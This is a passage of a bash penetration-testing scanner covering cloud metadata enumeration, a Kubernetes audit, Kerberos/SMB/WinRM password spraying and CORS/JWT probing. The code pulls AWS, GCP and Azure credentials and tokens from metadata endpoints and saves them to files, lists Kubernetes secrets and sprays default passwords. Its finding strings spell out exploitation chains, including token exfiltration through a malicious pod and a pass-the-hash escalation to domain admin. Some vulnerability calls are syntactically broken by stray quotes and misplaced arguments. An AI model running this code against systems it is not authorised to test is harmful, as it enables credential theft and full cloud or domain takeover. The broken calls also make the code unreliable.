        log_info "ZAP scanning: ${wt}"
        local safe_name; safe_name=$(echo "$wt" | sed 's|[:/]|_|g')
        local zap_timeout=300
        [[ "$SCAN_PROFILE" == "deep" ]] && zap_timeout=600

        # BUG FIX: -quickout writes HTML to same path as run_tool_timeout outfile → double-write
        # Capture stdout to a separate .log; let -quickout own the .html
        run_tool_timeout "zap-baseline-${safe_name}" "${zap_dir}/${safe_name}_stdout.log" "$zap_timeout" \
            "$zap_bin" -cmd -quickurl "$wt" \
            -quickprogress -quickout "${zap_dir}/${safe_name}.html" 2>/dev/null || true

        # Parse ZAP alerts for vuln_data
        if [[ -f "${zap_dir}/${safe_name}.html" ]]; then
            grep -iE "High|Critical|Medium" "${zap_dir}/${safe_name}.html" 2>/dev/null | \
                grep -o "<td>[^<]*</td>" | sed 's/<[^>]*>//g' | head -20 > "${zap_dir}/${safe_name}_alerts.txt" || true
            if grep -qiE "SQL Injection|XSS|Path Traversal|Command Injection" \
                "${zap_dir}/${safe_name}.html" 2>/dev/null; then
                add_vuln "HIGH" "OWASP ZAP DAST — Active Vulnerabilities Detected on ${wt}" \
                    "OWASP ZAP active scanning identified high-severity web vulnerabilities including possible SQLi, XSS, or path traversal." \
                    "Review ZAP HTML report in detail. Apply OWASP Top 10 remediations." \
                    "ZAP scan: ${zap_dir}/${safe_name}.html"
            fi
        fi
    done
    log_ok "ZAP DAST complete. Reports in: ${zap_dir}/"
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 24 — CLOUD METADATA ENUMERATION (AWS / GCP / Azure — free)
# ════════════════════════════════════════════════════════════════════════════════
phase_cloud_enum() {
    log_phase 24 "${PHASE_NAMES[24]}"
    local cloud_dir="${OUTPUT_DIR}/cloud_enum"
    CLOUD_DETECTED="none"

    log_section "Cloud provider fingerprinting"

    # AWS IMDS v1 (169.254.169.254)
    log_info "Probing AWS IMDS endpoint..."
    run_tool_timeout "aws-imds" "${cloud_dir}/aws_imds.txt" 10 \
        curl -s --connect-timeout 5 --max-time 8 \
        "http://169.254.169.254/latest/meta-data/" 2>/dev/null || true
    if [[ -s "${cloud_dir}/aws_imds.txt" ]]; then
        CLOUD_DETECTED="AWS"
        log_ok "AWS IMDS accessible — instance metadata exposed!"
        add_vuln "CRITICAL" "AWS Instance Metadata Service (IMDS) Exposed" \
            "The AWS IMDS endpoint (169.254.169.254) is reachable. An SSRF vulnerability could allow attackers to steal IAM credentials, role ARNs, user-data scripts, and instance identity documents." \
            "Enforce IMDSv2 (require session tokens). Block IMDS from application layer. Use Instance Profiles with least privilege." \
            "curl http://169.254.169.254/latest/meta-data/ — returned data" \
            "EXPLOIT: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -> role -> AccessKeyId+SecretKey+Token -> aws configure -> aws s3 ls; iam list-users -> full AWS account pivot." \
            "PATCH: 1) IMDSv2: aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required. 2) SCP deny policy org-wide. 3) App-layer iptables block 169.254.0.0/16. 4) Least-privilege IAM roles."

        # Dump sensitive AWS metadata
        for path in "iam/security-credentials/" "user-data" "hostname" \
                    "local-ipv4" "public-keys/" "placement/region"; do
            local clean_path="${path%/}"
            local fname="${clean_path//\//_}"
            run_tool_timeout "aws-imds-${fname}" \
                "${cloud_dir}/aws_${fname}.txt" 8 \
                curl -s --connect-timeout 4 --max-time 6 \
                "http://169.254.169.254/latest/meta-data/${clean_path}" 2>/dev/null || true
        done

        # IAM role credentials
        local role; role=$(cat "${cloud_dir}/aws_iam_security-credentials.txt" 2>/dev/null \
            | head -1 | tr -d '[:space:]')
        if [[ -n "$role" ]]; then
            run_tool_timeout "aws-iam-creds" "${cloud_dir}/aws_iam_creds.json" 8 \
                curl -s --connect-timeout 4 --max-time 6 \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}" 2>/dev/null || true
            if grep -q "AccessKeyId" "${cloud_dir}/aws_iam_creds.json" 2>/dev/null; then
                add_vuln "CRITICAL" "AWS IAM Credentials Leaked via IMDS" \
                    "AWS IAM temporary credentials (AccessKeyId + SecretAccessKey + SessionToken) leaked via IMDS. Attacker can pivot into the AWS account." \
                    "Immediately rotate credentials. Enable IMDSv2. Audit IAM permissions." \
                    "Role: ${role} — credentials dumped to ${cloud_dir}/aws_iam_creds.json"
            fi
        fi
    fi

    # GCP Metadata server
    log_info "Probing GCP metadata server..."
    run_tool_timeout "gcp-metadata" "${cloud_dir}/gcp_metadata.txt" 10 \
        curl -s --connect-timeout 5 --max-time 8 \
        -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>/dev/null || true
    if [[ -s "${cloud_dir}/gcp_metadata.txt" ]]; then
        CLOUD_DETECTED="GCP"
        log_ok "GCP metadata server accessible!"
        add_vuln "CRITICAL" "GCP Compute Metadata Server Exposed" \
            "GCP metadata server (metadata.google.internal) is reachable. Attackers can dump service account tokens, project info, SSH keys, and startup scripts via SSRF." \
            "Block metadata server access at application level. Use Workload Identity. Enforce least privilege service accounts." \
            "curl http://metadata.google.internal/computeMetadata/v1/ — returned data"

        run_tool_timeout "gcp-sa-token" "${cloud_dir}/gcp_sa_token.txt" 8 \
            curl -s --connect-timeout 4 --max-time 6 \
            -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || true
        if grep -q "access_token" "${cloud_dir}/gcp_sa_token.txt" 2>/dev/null; then
            add_vuln "CRITICAL" "GCP Service Account Token Leaked via Metadata" \
                "GCP service account OAuth2 access token obtained from metadata server. Grants API access to GCP resources." \
                "Rotate service account. Implement metadata server firewall rules. Audit Cloud IAM." \
                "Token saved in: ${cloud_dir}/gcp_sa_token.txt"
        fi
    fi

    # Azure IMDS
    log_info "Probing Azure IMDS..."
    run_tool_timeout "azure-imds" "${cloud_dir}/azure_imds.json" 10 \
        curl -s --connect-timeout 5 --max-time 8 \
        -H "Metadata: true" \
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || true
    if grep -qE "azEnvironment|subscriptionId|vmId" "${cloud_dir}/azure_imds.json" 2>/dev/null; then
        CLOUD_DETECTED="AZURE"
        log_ok "Azure IMDS accessible!"
        add_vuln "CRITICAL" "Azure Instance Metadata Service (IMDS) Exposed" \
            "Azure IMDS accessible. Subscription ID, VM identity, location, resource group, and managed identity tokens can be harvested via SSRF." \
            "Restrict IMDS access in networking rules. Use managed identities with minimal permissions. Audit Azure RBAC." \
            "curl http://169.254.169.254/metadata/instance — returned Azure metadata" \
            "EXPLOIT: curl -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/ -> access_token -> az CLI with stolen token -> full Azure subscription access." \
            "PATCH: 1) Restrict IMDS at NIC level in Azure portal. 2) Managed Identity with minimal RBAC roles. 3) Monitor for unusual management API calls. 4) Use Azure Defender for Cloud alerts on IMDS access."

        run_tool_timeout "azure-mi-token" "${cloud_dir}/azure_mi_token.json" 8 \
            curl -s --connect-timeout 4 --max-time 6 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || true
        if grep -q "access_token" "${cloud_dir}/azure_mi_token.json" 2>/dev/null; then
            add_vuln "CRITICAL" "Azure Managed Identity Token Leaked" \
                "Azure managed identity OAuth2 token leaked via IMDS. Grants access to Azure management APIs." \
                "Audit Azure RBAC. Rotate managed identity. Restrict IMDS." \
                "Token saved: ${cloud_dir}/azure_mi_token.json"
        fi
    fi

    # S3 bucket misconfig check
    if [[ "$TARGET_TYPE" == "DOMAIN" ]]; then
        log_section "S3 bucket permutation check"
        # ccTLD-safe base domain extraction
        # Extract meaningful base domain (avoid TLD fragments like "ac" from "gbu.ac.in")
    local base_domain
    if [[ "$TARGET_TYPE" == "DOMAIN" ]]; then
        # Remove TLD and country-code extensions — get the registrable domain
        base_domain=$(echo "$TARGET" | rev | cut -d. -f3- | rev | tr -d '.' | head -c 20)
        [[ -z "$base_domain" ]] && base_domain=$(echo "$TARGET" | cut -d. -f1)
    else
        base_domain="$TARGET"
    fi
        [[ -z "$base_domain" ]] && base_domain=$(echo "$TARGET" | cut -d. -f1)
        local buckets=("$TARGET" "$base_domain" "${base_domain}-backup" \
                      "${base_domain}-dev" "${base_domain}-prod" "${base_domain}-assets" \
                      "${base_domain}-data" "${base_domain}-logs" "backup-${base_domain}")
        for bucket in "${buckets[@]}"; do
            run_tool_timeout "s3-${bucket}" "${cloud_dir}/s3_${bucket}.txt" 8 \
                curl -s --connect-timeout 4 --max-time 6 \
                "https://${bucket}.s3.amazonaws.com/?list-type=2&max-keys=5" 2>/dev/null || true
            if grep -q "<Key>" "${cloud_dir}/s3_${bucket}.txt" 2>/dev/null && \
                grep -q "<ListBucketResult" "${cloud_dir}/s3_${bucket}.txt" 2>/dev/null && \
                ! grep -q "<Error>" "${cloud_dir}/s3_${bucket}.txt" 2>/dev/null; then
                add_vuln "CRITICAL" "Publicly Accessible AWS S3 Bucket: ${bucket}" \
                    "S3 bucket '${bucket}' is publicly readable. May expose sensitive files, backups, credentials, or source code." \
                    "Remove public access. Enable S3 Block Public Access. Audit bucket policies and ACLs." \
                    "https://${bucket}.s3.amazonaws.com — ListObjectsV2 returned file listing"
                printf "  \033[1;31m[CRITICAL]\033[0m Public S3 bucket: %s\n" "$bucket"
            fi
        done
    fi

    [[ "$CLOUD_DETECTED" == "none" ]] && log_info "No cloud metadata endpoints detected (target may not be cloud-hosted)"
    log_ok "Phase 24 (Cloud Enum) complete. Cloud: ${CLOUD_DETECTED}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 25 — KUBERNETES CLUSTER AUDIT (free — kube-hunter + API checks)
# ════════════════════════════════════════════════════════════════════════════════
phase_k8s_audit() {
    log_phase 25 "${PHASE_NAMES[25]}"
    local k8s_dir="${OUTPUT_DIR}/kubernetes"
    K8S_DETECTED=false

    log_section "Kubernetes API server detection"

    # Common k8s ports
    local k8s_ports=(6443 8443 8080 10250 10255 2379 2380)
    local k8s_found_ports=()

    for port in "${k8s_ports[@]}"; do
        if (timeout 3 bash -c ">/dev/tcp/${TARGET}/${port}" 2>/dev/null); then
            k8s_found_ports+=("$port")
        fi
    done

    if [[ ${#k8s_found_ports[@]} -eq 0 ]]; then
        log_info "No Kubernetes ports detected. Skipping K8s audit."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    # Verify it's actually Kubernetes — just having port 8443 open is not enough
    # Check for Kubernetes-specific API response
    local _k8s_confirmed=false
    for _kp in "${k8s_found_ports[@]}"; do
        local _kscheme="https"; [[ "$_kp" == "8080" ]] && _kscheme="http"
        local _kresp; _kresp=$(curl -sk --max-time 5 "${_kscheme}://${TARGET}:${_kp}/api" 2>/dev/null | head -c 200)
        if echo "$_kresp" | grep -qiE '"kind".*"APIVersions"|"apiVersion".*"v1"'; then
            _k8s_confirmed=true
            printf "  \\033[1;35m[INFO]\\033[0m Kubernetes API confirmed on port ${_kp}\\n"
            break
        fi
    done
    if [[ "$_k8s_confirmed" == false ]]; then
        log_info "Ports ${k8s_found_ports[*]} open but no Kubernetes API response — not a K8s cluster"
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    K8S_DETECTED=true
    log_ok "Kubernetes cluster confirmed: ports ${k8s_found_ports[*]}"

    # API Server — unauthenticated access probe
    for api_port in 6443 8443 8080; do
        local scheme="https"; [[ "$api_port" == "8080" ]] && scheme="http"
        local api_url="${scheme}://${TARGET}:${api_port}"

        run_tool_timeout "k8s-api-${api_port}" "${k8s_dir}/api_${api_port}.json" 15 \
            curl -sk --connect-timeout 8 --max-time 12 \
            "${api_url}/api/v1/namespaces" 2>/dev/null || true

        if grep -qE "\"namespaces\"|\"items\"|kube-system" \
            "${k8s_dir}/api_${api_port}.json" 2>/dev/null; then
            add_vuln "CRITICAL" "Kubernetes API Server Unauthenticated Access (port ${api_port})" \
                "The Kubernetes API server on port ${api_port} allows unauthenticated access. An attacker can list pods, secrets, namespaces, and deploy malicious workloads for full cluster compromise." \
                "Enable RBAC. Require authentication on API server. Remove --anonymous-auth=true. Use network policies." \
                "curl ${api_url}/api/v1/namespaces — returned namespace list" \
                "EXPLOIT: curl -sk ${api_url}/api/v1/secrets | jq → dump all secrets including service account tokens, TLS certs, DB passwords. Then: kubectl --server=${api_url} --insecure-skip-tls-verify create deployment pwned --image=alpine -- /bin/sh -c 'cat /run/secrets/kubernetes.io/serviceaccount/token; curl -s http://169.254.169.254/latest/meta-data/' → cloud metadata + token exfil. Full cluster takeover in minutes." \
                "PATCH: 1) Remove --anonymous-auth=true from kube-apiserver manifest. 2) Enable RBAC: --authorization-mode=Node,RBAC. 3) Restrict API server network access: firewall to allow only kubelets and control plane IPs. 4) Apply CIS Kubernetes Benchmark: kube-bench run --targets master. 5) Enable audit logging: --audit-log-path=/var/log/k8s-audit.log."
        fi

        # List secrets (critical if unauthenticated)
        run_tool_timeout "k8s-secrets-${api_port}" "${k8s_dir}/secrets_${api_port}.json" 15 \
            curl -sk --connect-timeout 8 --max-time 12 \
            "${api_url}/api/v1/secrets" || true
        if grep -qE "\"Secret\"|\"items\"" "${k8s_dir}/secrets_${api_port}.json" 2>/dev/null; then
            add_vuln "CRITICAL" "Kubernetes Secrets Exposed via Unauthenticated API" \
                "K8s secrets (may include service account tokens, TLS certs, database passwords, cloud credentials) are accessible without authentication." \
                "Immediately restrict API server access. Enable RBAC. Rotate all secrets. Audit RBAC policies." \
                "curl ${api_url}/api/v1/secrets — returned secret objects"
        fi
    done

    # Kubelet read-only port 10255 (deprecated but sometimes enabled)
    if (timeout 3 bash -c ">/dev/tcp/${TARGET}/10255" 2>/dev/null); then
        run_tool_timeout "kubelet-readonly" "${k8s_dir}/kubelet_pods.json" 15 \
            curl -s --connect-timeout 8 --max-time 12 \
            "http://${TARGET}:10255/pods" || true
        if grep -qE "\"Pod\"|\"containers\"" "${k8s_dir}/kubelet_pods.json" 2>/dev/null; then
            add_vuln "HIGH" "Kubelet Read-Only Port Exposed (10255)" \
                "Kubelet read-only API exposes pod specs, container names, environment variables, and possibly secrets mounted as env vars." \
                "Disable --read-only-port=0 in kubelet config. Apply PodSecurity policies." \
                "curl http://${TARGET}:10255/pods — returned pod listing"
        fi
    fi

    # Kubelet API port 10250 — exec and log access
    if (timeout 3 bash -c ">/dev/tcp/${TARGET}/10250" 2>/dev/null); then
        run_tool_timeout "kubelet-api" "${k8s_dir}/kubelet_api.txt" 10 \
            curl -sk --connect-timeout 8 --max-time 12 \
            "https://${TARGET}:10250/runningpods/" || true
        if grep -q "\"Pod\"" "${k8s_dir}/kubelet_api.txt" 2>/dev/null; then
            add_vuln "CRITICAL" "Kubelet API Accessible Without Authentication (10250)" \
                "Kubelet HTTPS API on port 10250 is accessible. Allows executing commands in any container on the node, equivalent to full node RCE." \
                "Enable Kubelet authentication (--authentication-token-webhook). Disable anonymous access. Apply network policies." \
                "curl https://${TARGET}:10250/runningpods/ — pod data returned"
        fi
    fi

    # etcd unauth access
    if (timeout 3 bash -c ">/dev/tcp/${TARGET}/2379" 2>/dev/null); then
        run_tool_timeout "etcd-api" "${k8s_dir}/etcd_members.json" 10 \
            curl -s --connect-timeout 8 --max-time 10 \
            "http://${TARGET}:2379/v2/members" || true
        if grep -qE "\"members\"|\"clientURLs\"" "${k8s_dir}/etcd_members.json" 2>/dev/null; then
            add_vuln "CRITICAL" "etcd Cluster Accessible Without Authentication" \
                "etcd (Kubernetes backing store) is accessible on port 2379 without TLS/auth. All K8s secrets, configs, and credentials can be dumped from etcd." \" \
            "EXPLOIT: curl http://TARGET:2379/v3/keys?recursive=true -> ALL K8s secrets, tokens, kubeconfig. Extract service account token -> kubectl --token=TOKEN -> cluster admin access." \
            "PATCH: 1) Enable TLS on etcd. 2) Require client certs: --client-cert-auth=true. 3) Firewall port 2379/2380 to control plane only. 4) Rotate all K8s secrets."
                "Enable etcd peer and client TLS. Require client certificates. Restrict etcd to localhost or control-plane network." \
                "curl http://${TARGET}:2379/v2/members — returned cluster member data"
        fi
    fi

    # kube-hunter (free open-source k8s auditor by Aqua)
    # BUG FIX: two back-to-back run_tool_timeout calls with same name double-counts
    # TOOLS_ATTEMPTED and overwrites the output file. Use if/else to call only one.
    if command -v kube-hunter &>/dev/null || python3 -m kube_hunter --help &>/dev/null 2>&1; then
        log_info "kube-hunter detected — running remote scan..."
        local kube_hunter_cmd=""
        if python3 -m kube_hunter --help &>/dev/null 2>&1; then
            kube_hunter_cmd="python3 -m kube_hunter"
        elif command -v kube-hunter &>/dev/null; then
            kube_hunter_cmd="kube-hunter"
        fi
        if [[ -n "$kube_hunter_cmd" ]]; then
            # BUG FIX: unquoted $TARGET inside bash -c string breaks if TARGET has special chars
            run_tool_timeout "kube-hunter" "${k8s_dir}/kube_hunter.txt" 120 \
                bash -c "${kube_hunter_cmd} --remote '${TARGET}' --report plain" 2>/dev/null || true
        fi

        if grep -qiE "vulnerabilit|critical|high" "${k8s_dir}/kube_hunter.txt" 2>/dev/null; then
            add_vuln "HIGH" "kube-hunter: Kubernetes Vulnerabilities Found" \
                "kube-hunter automated K8s audit found vulnerabilities on the cluster. Review full report." \
                "Apply Kubernetes CIS Benchmark hardening. Update cluster version. Restrict RBAC." \
                "See: ${k8s_dir}/kube_hunter.txt"
        fi
    else
        log_info "kube-hunter not installed. Install: timeout 120 pip3 install kube-hunter --break-system-packages"
        {
            echo "# kube-hunter install instructions"
            echo "timeout 120 pip3 install kube-hunter --break-system-packages"
            echo "python3 -m kube_hunter --remote ${TARGET} --report plain"
        } > "${k8s_dir}/kube_hunter_install.txt"
    fi

    log_ok "Phase 25 (Kubernetes Audit) complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PASSWORD SPRAY MODULE — Kerbrute + CrackMapExec (free tools)
# ════════════════════════════════════════════════════════════════════════════════
phase_password_spray() {
    log_phase 26 "${PHASE_NAMES[26]}"
    local spray_dir="${OUTPUT_DIR}/password_spray"
    mkdir -p "$spray_dir" 2>/dev/null || true

    # Only run in standard/deep mode
    if [[ "$SCAN_PROFILE" == "quick" ]]; then
        log_info "Password spray skipped in Quick mode."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    # Wordlists
    local user_list="" pass_list=""
    for ul in /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
              /usr/share/wordlists/metasploit/unix_users.txt \
              /usr/share/seclists/Usernames/Names/names.txt; do
        [[ -f "$ul" ]] && user_list="$ul" && break
    done
    for pl in /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \
              /usr/share/wordlists/fasttrack.txt \
              /usr/share/wordlists/rockyou.txt; do
        [[ -f "$pl" ]] && pass_list="$pl" && break
    done

    if [[ -z "$user_list" || -z "$pass_list" ]]; then
        log_warn "Wordlists not found — creating minimal built-in lists"
        mkdir -p "$spray_dir" 2>/dev/null || true
        # BUG FIX: echo -e \n is non-portable; use printf for guaranteed \n handling
        printf 'admin\nroot\nuser\nguest\ntest\noperator\nservice\nadministrator\n' \
            > "${spray_dir}/users.txt"
        printf 'admin\npassword\n123456\nPassword1\nwelcome\nletmein\nqwerty\npassword123\n' \
            > "${spray_dir}/passwords.txt"
        user_list="${spray_dir}/users.txt"
        pass_list="${spray_dir}/passwords.txt"
    fi

    log_section "Kerbrute — Kerberos user enumeration & password spray"
    if command -v kerbrute &>/dev/null; then
        # BUG FIX: kerbrute -d requires FQDN realm, not an IP address — guard with TARGET_TYPE
        local krb_domain=""
        if [[ "$TARGET_TYPE" == "DOMAIN" ]]; then
            krb_domain="$TARGET"
        else
            log_info "Kerberos spray skipped for IP target — kerbrute -d requires an FQDN realm"
        fi

        # Only run kerbrute if port 88 is open OR AD is detected
        local _krb_port_open=false
        echo "${OPEN_PORTS:-}" | grep -qE "(^|,)88(,|$)" && _krb_port_open=true
        if [[ -n "$krb_domain" ]] && [[ "$_krb_port_open" == "true" ]]; then
            run_tool_timeout "kerbrute-userenum" "${spray_dir}/kerbrute_users.txt" 120 \
                kerbrute userenum --dc "$TARGET" -d "$krb_domain" "$user_list" 2>/dev/null || true

            if [[ -f "${spray_dir}/kerbrute_users.txt" ]] && \
               grep -q "VALID" "${spray_dir}/kerbrute_users.txt" 2>/dev/null; then
                grep "VALID" "${spray_dir}/kerbrute_users.txt" \
                    | awk '{print $NF}' | sed 's/@.*//' \
                    > "${spray_dir}/valid_users.txt" 2>/dev/null || true
                local valid_count; valid_count=$(wc -l < "${spray_dir}/valid_users.txt" 2>/dev/null || true); valid_count=$(( 10#0${valid_count} ))
                log_ok "Valid Kerberos users found: ${valid_count}"
                [[ ${valid_count:-0} -gt 0 ]] && add_vuln "MEDIUM" \
                    "Kerberos User Enumeration — ${valid_count} Valid Accounts Found" \
                    "Kerbrute identified ${valid_count} valid domain accounts via AS-REQ timing analysis. No credentials required for enumeration." \
                    "Deploy honeypot accounts. Rate-limit Kerberos AS-REQ. Enable audit logging for AS-REQ failures." \
                    "$(head -5 "${spray_dir}/valid_users.txt" 2>/dev/null | tr '\n' ' ')"

                local spray_pass="Password1"
                # BUG FIX: removed -o duplicate output flag (run_tool_timeout handles outfile)
                run_tool_timeout "kerbrute-spray" "${spray_dir}/kerbrute_spray.txt" 120 \
                    kerbrute passwordspray --dc "$TARGET" -d "$krb_domain" \
                    "${spray_dir}/valid_users.txt" "$spray_pass" 2>/dev/null || true
                if grep -q "SUCCESS" "${spray_dir}/kerbrute_spray.txt" 2>/dev/null; then
                    add_vuln "CRITICAL" "Kerberos Password Spray — Credentials Found" \
                        "Password spray attack succeeded. Weak/default passwords in use on domain accounts." \" \
                    "EXPLOIT: evil-winrm -i TARGET -u USER -p PASSWORD -> PS shell -> whoami /groups -> secretsdump.py DOMAIN/USER:PASS@TARGET -> NTLM hashes -> pass-the-hash -> domain admin." \
                    "PATCH: 1) Enable Azure AD Password Protection (bans common passwords). 2) Enforce MFA. 3) Enable Smart Lockout. 4) Monitor Event ID 4625 mass failures. 5) Sentinel alert for spray patterns."
                        "Enforce strong password policy. Enable MFA. Deploy Azure AD Password Protection." \
                        "$(grep 'SUCCESS' "${spray_dir}/kerbrute_spray.txt" | head -3)"
                fi
            fi
        fi
    else
        log_warn "kerbrute not found. Install: apt install kerbrute  OR  download from github.com/ropnop/kerbrute"
    fi

    log_section "CrackMapExec — SMB password spray"
    if command -v crackmapexec &>/dev/null && \
       grep -q "445/tcp.*open" "${OUTPUT_DIR}/nmap/nmap_tcp.txt" 2>/dev/null; then
        run_tool_timeout "cme-spray-smb" "${spray_dir}/cme_smb_spray.txt" 180 \
            crackmapexec smb "$TARGET" \
            -u "$user_list" -p "$pass_list" \
            --continue-on-success 2>/dev/null || true
        if grep -qiE "\[+\]|Pwn3d" "${spray_dir}/cme_smb_spray.txt" 2>/dev/null; then
            add_vuln "CRITICAL" "SMB Credentials Found via CrackMapExec Spray" \
                "CrackMapExec password spray against SMB succeeded. One or more accounts authenticate with weak/default credentials." \
                "Change all weak passwords immediately. Enable account lockout policy. Deploy LAPS for local admin passwords." \
                "$(grep -E '\[+\]|Pwn3d' "${spray_dir}/cme_smb_spray.txt" | head -3)"
        fi
    fi

    log_section "CrackMapExec — WinRM password spray"
    if command -v crackmapexec &>/dev/null && \
       grep -qE "5985/tcp|5986/tcp" "${OUTPUT_DIR}/nmap/nmap_tcp.txt" 2>/dev/null; then
        run_tool_timeout "cme-spray-winrm" "${spray_dir}/cme_winrm_spray.txt" 120 \
            crackmapexec winrm "$TARGET" \
            -u "$user_list" -p "$pass_list" \
            --continue-on-success 2>/dev/null || true
        if grep -qiE "\[+\]|Pwn3d" "${spray_dir}/cme_winrm_spray.txt" 2>/dev/null; then
            add_vuln "CRITICAL" "WinRM Credentials Found — Remote Command Execution Possible" \
                "Authenticated WinRM access obtained. Attacker can execute commands remotely via evil-winrm or CrackMapExec." \
                "Disable WinRM if not needed. Restrict to admin accounts only. Enable Just-Enough-Administration (JEA)." \
                "$(grep -E '\[+\]|Pwn3d' "${spray_dir}/cme_winrm_spray.txt" | head -3)"
        fi
    fi

    log_ok "Phase 26 (Password Spray) complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 27 — CORS & JWT AUTHENTICATION TESTING
# ════════════════════════════════════════════════════════════════════════════════
phase_cors_jwt() {
    log_phase 27 "${PHASE_NAMES[27]}"
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")
    local cors_dir="${OUTPUT_DIR}/cors_jwt"
    mkdir -p "$cors_dir" 2>/dev/null || true

    # ── Tool availability check ───────────────────────────────────────────────
    local has_python3=false
    command -v python3 &>/dev/null && has_python3=true
    # curl is a required core tool — assumed always present
    log_info "Phase 27 tools: curl=✓ python3=$([[ "$has_python3" == true ]] && echo ✓ || echo ✗)"

    # ── CORS Testing ─────────────────────────────────────────────────────────
    log_section "CORS misconfiguration testing..."
    local cors_origins=(
        "https://evil.com"
        "https://${TARGET}.evil.com"
        "null"
        "https://evil${TARGET}"
    )

    for web_url in "${WEB_TARGETS[@]:0:4}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')
        for origin in "${cors_origins[@]}"; do
            local cors_resp; cors_resp=$(curl -s -X GET --max-time 10 \
                -H "Origin: ${origin}" \
                -H "Access-Control-Request-Method: GET" \
                "$web_url" 2>/dev/null || echo "")
            local acao; acao=$(echo "$cors_resp" | grep -i "Access-Control-Allow-Origin" | tr -d '\r' | head -1 || echo "")
            local acac; acac=$(echo "$cors_resp" | grep -i "Access-Control-Allow-Credentials" | tr -d '\r' | head -1 || echo "")

            if echo "$acao" | grep -qF "$origin"; then
                # Origin is reflected
                if echo "$acac" | grep -qi "true"; then
                    add_vuln "CRITICAL" "CORS Wildcard + Credentials: ${web_url}" \
                        "Server reflects arbitrary Origin and allows credentials. Attacker can make cross-origin authenticated requests stealing session data." \
                        "Whitelist specific trusted origins. Never combine ACAO: * with ACAC: true." \
                        "Origin: ${origin} → ACAO: ${acao} | ACAC: ${acac}"
                else
                    add_vuln "HIGH" "CORS Origin Reflection (no creds): ${web_url}" \
                        "Server reflects attacker-controlled Origin in Access-Control-Allow-Origin header." \
                        "Whitelist specific trusted origins. Validate Origin header server-side." \
                        "Origin: ${origin} → ACAO: ${acao}"
                fi
                echo "CORS hit: ${web_url} Origin=${origin} ACAO=${acao} ACAC=${acac}" \
                    >> "${cors_dir}/cors_hits.txt"
                break
            fi

            # Check for null origin acceptance
            if [[ "$origin" == "null" ]] && echo "$acao" | grep -qi "null"; then
                add_vuln "HIGH" "CORS Null Origin Accepted: ${web_url}" \
                    "Server accepts null Origin — exploitable from sandboxed iframes or local files." \
                    "Never allow null Origin in production CORS policy." \
                    "Origin: null → ${acao}"
            fi
        done

        # Check for missing CORS Vary header (cache poisoning risk)
        local vary; vary=$(curl -s -I --max-time 10 "$web_url" 2>/dev/null \
            | grep -i "^Vary:" | tr -d '\r' | head -1 || echo "")
        local acao_check; acao_check=$(curl -s -I --max-time 10 \
            -H "Origin: https://trusted.com" "$web_url" 2>/dev/null \
            | grep -i "Access-Control-Allow-Origin" | tr -d '\r' | head -1 || echo "")
        if [[ -n "$acao_check" ]] && ! echo "$vary" | grep -qi "Origin"; then
            add_vuln "MEDIUM" "CORS Response Missing Vary: Origin Header (${web_url})" \
                "CORS responses do not include Vary: Origin, enabling CORS cache poisoning attacks." \
                "Add 'Vary: Origin' to all CORS responses." \
                "ACAO present but Vary: Origin absent"
        fi
    done

    # ── JWT Testing ──────────────────────────────────────────────────────────
    log_section "JWT token testing..."

    for web_url in "${WEB_TARGETS[@]:0:4}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')

        # Try to find JWT in common login endpoints
        local jwt_paths=("/api/login" "/api/auth" "/api/token" "/auth/login" "/login" "/api/v1/auth")
        for jpath in "${jwt_paths[@]}"; do
            local jwt_resp; jwt_resp=$(curl -s --max-time 10 \
                -X POST -H "Content-Type: application/json" \
                -d '{"username":"test","password":"test"}' \
                "${web_url}${jpath}" 2>/dev/null | head -c 2048 || echo "")

            # Extract JWT from response
            local jwt_token; jwt_token=$(echo "$jwt_resp" | \
                grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1 || echo "")

            if [[ -n "$jwt_token" ]]; then
                log_info "JWT token found at ${web_url}${jpath}"
                echo "$jwt_token" > "${cors_dir}/jwt_${slug}.txt"

                # Decode header — python3 preferred; fallback to base64 command
                local jwt_header=""
                if [[ "$has_python3" == true ]]; then
                    jwt_header=$(echo "$jwt_token" | cut -d. -f1 | \
                        python3 -c "import sys,base64; h=sys.stdin.read().strip(); \
                        h+='=='*((-len(h))%4); print(base64.b64decode(h).decode('utf-8','replace'))" \
                        2>/dev/null || echo "")
                else
                    # Pure-shell fallback: base64 -d if python3 unavailable
                    local padded; padded=$(echo "$jwt_token" | cut -d. -f1)
                    while (( ${#padded} % 4 != 0 )); do padded="${padded}="; done
                    jwt_header=$(echo "$padded" | base64 -d 2>/dev/null || echo "")
                fi

                # Check for alg:none
                if echo "$jwt_header" | grep -qiE '"alg"\s*:\s*"none"'; then
                    add_vuln "CRITICAL" "JWT Algorithm: none Accepted (${web_url}${jpath})" \
                        "Server issued a JWT with algorithm 'none' — no signature verification. Attacker can forge any claims." \
